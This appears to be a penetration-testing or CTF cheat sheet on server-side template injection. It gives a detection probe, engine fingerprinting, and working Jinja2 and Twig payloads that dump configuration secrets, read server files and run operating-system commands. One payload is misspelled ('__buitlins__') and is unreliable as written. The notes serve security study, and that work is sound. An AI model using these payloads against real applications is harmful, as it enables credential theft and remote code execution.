# Server Side Template Injection (SSTI)

## Is the Web App Vulnerable?
Inject the following string:
`${{<%[%'"}}%\\.`
If it causes an error then the application might be vulnerable.

## Identifying the Template Engine
Start by injecting the payload `{7*7}`, then follow the diagram from left to right depending on the result of the injection.
- Green = successful arrow
- Red = unsuccessful arrow
A successful result for `{7*7}` would be if you see `49` rendered on the web page. That means you have successfully injected a payload.

![SSTI Diagram](assets/ssti-diagram.webp)

## Jinja Exploitation
Jinja is a Python templating engine that is usually used with either Flask or Django. The payloads below are targeted at Flask applications. If the payloads do not work check if the app is built with Python and Django.
### Show Application Configuration
This might show secret keys, API keys, or even database or other types of passwords.
`{{config.items()}}`
### Dump All Available Built-in Functions
`{{self.__init__.__globals__.__buitlins__}}`
### Reading System Files
You can read files on the server's filesystem such as the users file or any other files (like a flag for the CTF).
`{{self.__init__.__globals__.__builtins__.open("<filename>").read()}}`
### Remote Code Execution (RCE)
This will allow you to run commands on the server which is very dangerous.
`{{self.__init__.__globals__.__builtins__.__import__('os').popen('<command-to-run>').read()}}`

## Exploiting Twig
Twig is a PHP templating engine, so if you know that the web app is built with PHP it is worth trying.
### Application Information
`{{_self}}`
It might not show a lot of information but it is worth a try.
### Reading System Files
`{{"<filename>"|file_excerpt(1,-1)}}`
### Remote Code Execution (RCE)
`{{['<command-to-run>']|filter('system')}}`

**Note: If you are sending the payloads above as part of request parameters you might have to double encode the characters (in burpsuite highlight the payload and press Ctrl+U 2 times.**

## Extra Resources
- [Jinja Payloads](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
